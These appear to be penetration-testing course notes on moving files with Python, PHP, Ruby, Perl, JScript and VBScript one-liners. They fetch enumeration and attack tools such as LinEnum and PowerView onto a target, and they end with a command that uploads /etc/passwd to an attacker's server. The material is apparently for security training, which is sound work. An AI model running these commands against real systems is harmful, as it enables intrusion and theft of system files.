Common Programming Languages on Linux Distros:

- Python
- Perl
- PHP
- Ruby

Windows Default applications:

- cscript
- mshta

**Python**

- Currently Python 3 is supported, however we may run into a situation where we have a target that is still running Python 2.7.

**Python2 - Download:**

`[!bash!]**$** python2.7 -c 'import urllib;urllib.urlretrieve ("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "LinEnum.sh")'`

**Python3 - Download:**

`[!bash!]**$** python3 -c 'import urllib.request;urllib.request.urlretrieve("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "LinEnum.sh")'`

**PHP**

- PHP is used by 77.4% of all websites with a known server-side programming language.
    
- We can use the following modules to download content from a website:
    - file_get_contents()
    - file_put_contents()
- Using PHP to download file using file_get_contents():
    - `[!bash!]**$** php -r '$file = file_get_contents("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>"); file_put_contents("LinEnum.sh",$file);'`
- An alternative to the file_get_contents() and file_put_contents() is fopen():
```bash
    [!bash!]$ php -r 'const BUFFER = 1024; $fremote =
    fopen("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    ```
**Other Languages:**

Ruby and Perl are other popular languages that can be used to transfer files:

- Using Ruby to download files:

`[!bash!]**$** ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>")))'`

- Using Perl to download files:

`[!bash!]**$** perl -e 'use LWP::Simple; getstore("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "LinEnum.sh");'`

**Javascript:**

- Allows for the implementation of complex features on web pages.
- We can create a wget.js to download and save the content:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /_async=_/false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));
```

**Downloading a file using javascript and cscript.exe

```powershell
C:\htb> cscript.exe /nologo wget.js [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1]
```

VBScript (Microsoft Visual Basic Scripting Edition)**

- The following is an example VBScript that we can create and execute our code via Command Prompt or Powershell.

---


```VBScript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
- The file that we created above is titled wget.vbs

`C:\\htb> cscript.exe /nologo wget.vbs <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1> PowerView2.ps1`

**Uploading Operations using Python3:**

- The python3 module allows you to send HTTP requests (GET, POST, PUT, etc) using Python.
- We can use our Python3 uploadserver

```bash
[!bash!]$ python3 -m uploadserver File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...

```

**Uploading a File Using a Python one-liner:**

`[!bash!]**$** python3 -c 'import requests;requests.post("<http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb>")})'`

Let’s divide this python one-liner up for further exlpanation

```python
# To use the requests function, we need to import the module first. 
import requests 

# Define the target URL where we will upload the file. 
URL = "http://192.168.49.128:8000/upload" 

# Define the file we want to read, open it and save it in a variable. 
file = open("/etc/passwd","rb") 

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```